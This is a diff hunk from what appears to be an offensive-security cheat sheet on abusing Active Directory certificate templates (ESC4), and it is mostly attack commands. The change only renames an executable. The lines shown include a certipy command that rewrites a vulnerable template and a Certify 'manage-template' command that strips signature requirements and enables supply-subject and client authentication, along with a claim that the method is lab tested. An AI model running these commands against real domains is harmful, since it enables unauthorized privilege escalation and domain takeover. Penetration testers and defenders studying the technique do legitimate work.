@@ -85,7 +85,7 @@ certipy template -u $USER -p $PASSWORD -template ESC4 -dc-ip $IP -target $DC -wr
 #### Certify_2
 ```sh
 # new Certify
-.\c.exe manage-template --template ESC4 --authorized-signatures 0 --manager-approval --supply-subject --client-auth --pkinit-auth --esc9
+.\Certify.exe manage-template --template ESC4 --authorized-signatures 0 --manager-approval --supply-subject --client-auth --pkinit-auth --esc9
 ```
 #### powershell
 **IT WORKS, HAVE BEEN LAB TESTED**
